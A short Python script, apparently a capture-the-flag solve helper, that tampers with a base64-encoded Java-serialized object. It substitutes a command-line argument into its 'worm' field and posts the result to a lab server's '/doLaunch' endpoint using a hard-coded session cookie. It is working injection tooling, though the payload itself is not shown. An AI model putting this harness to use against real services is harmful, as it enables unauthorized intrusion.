import sys
import string
import base64
import requests

headers = {
    "Cookie": "JSESSIONID=B1A763938E7F8026AE279906A20F0D96",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

url = "http://138.68.147.232:30885"

worm = b'{\'worm\':\'den_zuko\'}'

original = "rO0ABXQAE3snd29ybSc6J2Rlbl96dWtvJ30="
decoded = base64.b64decode(original.encode("ascii"))

def send(p):
    payload = b'{\'worm\':\'' + p.encode("ascii") + b'\'}'
    new = decoded.replace(worm, payload)
    print(decoded, new)

    encoded = base64.b64encode(new).decode("ascii")
    print(original, encoded)

    data = {
        "country":"aasaa",
        "worm":encoded
    }

    r = requests.post(url+"/doLaunch", headers=headers, data=data)
    print(r.text)

send(sys.argv[1])